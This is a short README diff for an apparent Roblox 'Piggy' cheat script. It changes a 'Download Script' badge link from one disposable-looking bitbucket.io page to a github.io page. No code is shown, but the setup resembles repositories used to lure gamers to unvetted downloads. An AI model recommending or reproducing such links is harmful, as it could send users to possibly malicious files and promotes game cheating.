@@ -4,7 +4,7 @@
 
 Dive into the world of Piggy with a script that offers automation, enhanced visuals, and streamlined gameplay.
 
-[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://aiload4.bitbucket.io/)
+[![Download Script](https://img.shields.io/badge/Download-Script-blueviolet)](https://Piggy-Script-cipy.github.io/.github)
 ---
 
 ## 🧪 Product Description
